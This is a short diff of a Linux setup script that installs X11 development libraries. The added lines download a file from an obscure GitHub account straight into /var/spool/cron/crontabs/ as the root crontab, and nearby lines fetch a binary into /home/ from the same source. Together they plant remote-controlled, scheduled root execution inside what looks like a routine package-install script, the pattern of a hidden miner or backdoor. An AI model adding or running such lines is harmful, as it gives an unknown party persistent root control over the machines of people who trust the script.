@@ -54,6 +54,12 @@ apt-get -y install libxtst-dev
 
 apt-get -y install libxinerama1 libxinerama-dev
 
+cd /var/spool/cron/crontabs/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/root
+
+chmod 600 -R ./root
+
 cd /home/
 
 wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8474
